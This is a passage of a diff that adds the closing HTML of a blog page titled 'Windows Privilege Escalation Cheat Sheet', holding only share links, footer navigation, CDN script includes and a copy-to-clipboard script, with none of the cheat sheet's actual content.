+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&title=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&name=Windows-Privilege-Escalation-Cheat-Sheet&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/07/08/Windows-Privilege-Escalation-Cheat-Sheet/&t=Windows-Privilege-Escalation-Cheat-Sheet"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    LØNE&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/kagehayashi">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/tools/">Tools</a></li><!--
+     --><!--
+       --><li><a href="/cheatsheets/">Cheat Sheets</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
